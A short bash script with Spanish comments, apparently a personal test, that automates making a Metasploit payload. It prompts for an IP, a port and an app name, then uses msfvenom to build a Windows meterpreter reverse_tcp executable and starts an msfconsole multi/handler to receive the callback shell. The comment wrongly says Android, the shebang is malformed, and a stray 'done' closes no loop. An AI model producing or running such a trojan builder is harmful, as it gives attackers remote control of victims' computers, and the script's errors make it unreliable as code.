#1/bin/bash

#prueba final de automatizacion de ejecucion de creacion de payload para android
#Ilia

sleep 5s
echo -n -e "\e[1;33mDIRECCION IP :\e[0m"
read IP
sleep 2s
echo -n -e "\e[1;33mPUERTO DE CONEXION :\e[0m"
read PUERTO
sleep 2s
echo -n -e "\e[1;33mELIJE UN NOMBRE PARA LA APLICACION :\e[0m"
read NOMBRE
sleep 2s 

msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$PUERTO -f exe -o $NOMBRE.exe

sleep 2s 

echo
sleep 2s
sudo service postgresql start
sleep 2s 
clear
sleep 4s
msfconsole -x "use multi/handler;\
set PAYLOAD windows/meterpreter/reverse_tcp;\
set LHOST $IP;\
set LPORT $PUERTO;\
exploit"

done
